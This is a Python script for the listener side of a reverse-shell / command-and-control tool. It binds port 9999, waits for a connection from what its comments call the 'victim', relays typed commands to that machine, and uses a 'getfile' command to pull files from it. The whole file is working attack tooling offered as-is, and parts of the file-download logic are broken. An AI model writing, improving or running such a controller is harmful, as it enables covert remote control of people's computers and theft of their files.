#!/usr/bin/env python3

import socket
import sys
import os
import tqdm
import re
import cv2



SEPERATOR=","
# create a socket 
def create_socket():
    try:
        global host
        global port
        global s
        host   ="0.0.0.0"
        port   =9999
        s=socket.socket()
    except socket.error as msg:
        print("socket connetion erro msg" + str(msg))

#binding the socket and listening connection 

def bind_socket():
    try:
        global host
        global port
        global s
        host="0.0.0.0"
        print("binding the port "+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error" + str(msg) + "Retrying...")
        bind_socket()

#accepting connection (must be litening)

def socket_accept():
    # try:
    #     global host
    #     global port
    #     global s
        conn,address = s.accept()
        print("connection has been established | "+ " IP " + address[0] + " | port " + str(address[1]))
        send_command(conn)
        conn.close()

# send commands to client/victim

def send_command(conn):
    while True:
        cmd = input()
        
        if len(str.encode(cmd))> 0:

            if cmd == "quit":
                conn.close()
                s.close()
                sys.exit()
            
            if cmd[:7] == "getfile":
                conn.send(str.encode(cmd))
                
                received=conn.recv(4096).decode()
                
                if download_file(received,conn):
                    print("download succefull")
                else:
                    print("download failed")
            
            
            
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(4096),"utf-8")
            print(client_response, end="")
            
            
            
        
           
          
        



def download_file(received,conn):

    filename = received
    filename = os.path.basename(filename)
    # filesize = int(filesize)
    # start receiving the file from the socket
    
    if  re.search(r"\w+\.(png)$",filename):
        image=conn.recv()
        if image:
            print(filename)

    # and writing to the file stream
    else:    
        with open(filename, "wb") as f:
                    # read 1024 bytes from the socket (receive)
                bytes_read = conn.recv(4096)
                if  bytes_read:
                    f.write(bytes_read)
                else:
                    return False                   
    return True
def main():
    
    create_socket()
    bind_socket()
    socket_accept()

main()
